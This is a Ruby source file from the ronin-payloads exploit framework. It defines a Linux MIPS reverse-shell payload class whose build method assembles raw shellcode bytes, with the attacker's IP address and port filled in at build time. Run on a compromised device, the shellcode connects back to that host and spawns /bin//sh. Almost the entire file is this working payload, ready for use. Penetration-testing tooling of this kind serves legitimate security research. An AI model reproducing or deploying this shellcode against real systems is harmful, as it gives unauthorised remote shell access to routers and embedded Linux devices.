# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require_relative '../../../../shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module MIPS
          #
          # Linux MIPS shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/linux/mips/reverse_shell'

            arch :mips
            os :linux

            author 'rigan', email: 'imrigan@gmail.com'

            summary 'Linux MIPS reverse shell shellcode'
            description <<~DESC
              Linux MIPS shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-794.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              sin_addr_hi = packed_ipv4[0,2]
              sin_addr_lo = packed_ipv4[2,2]

              @payload = "\x24\x0f\xff\xfd" \
                         "\x01\xe0\x20\x27" \
                         "\x01\xe0\x28\x27" \
                         "\x28\x06\xff\xff" \
                         "\x24\x02\x10\x57" \
                         "\x01\x01\x01\x0c" \
                         \
                         "\xaf\xa2\xff\xff" \
                         "\x8f\xa4\xff\xff" \
                         "\x24\x0f\xff\xfd" \
                         "\x01\xe0\x78\x27" \
                         "\xaf\xaf\xff\xe0" \
                         "\x3c\x0e#{packed_port}" \
                         "\x35\xce#{packed_port}" \
                         "\xaf\xae\xff\xe4" \
                         \
                         "\x3c\x0d#{sin_addr_hi}" \
                         "\x35\xad#{sin_addr_lo}" \
                         \
                         "\xaf\xad\xff\xe6" \
                         "\x23\xa5\xff\xe2" \
                         "\x24\x0c\xff\xef" \
                         "\x01\x80\x30\x27" \
                         "\x24\x02\x10\x4a" \
                         "\x01\x01\x01\x0c" \
                         \
                         "\x24\x0f\xff\xfd" \
                         "\x01\xe0\x28\x27" \
                         "\x8f\xa4\xff\xff" \
                         "\x24\x02\x0f\xdf" \
                         "\x01\x01\x01\x0c" \
                         "\x20\xa5\xff\xff" \
                         "\x24\x01\xff\xff" \
                         "\x14\xa1\xff\xfb" \
                         \
                         "\x28\x06\xff\xff" \
                         "\x3c\x0f\x2f\x2f" \
                         "\x35\xef\x62\x69" \
                         "\xaf\xaf\xff\xf4" \
                         "\x3c\x0e\x6e\x2f" \
                         "\x35\xce\x73\x68" \
                         "\xaf\xae\xff\xf8" \
                         "\xaf\xa0\xff\xfc" \
                         "\x27\xa4\xff\xf4" \
                         "\x28\x05\xff\xff" \
                         "\x24\x02\x0f\xab" \
                         "\x01\x01\x01\x0c"
            end

          end
        end
      end
    end
  end
end
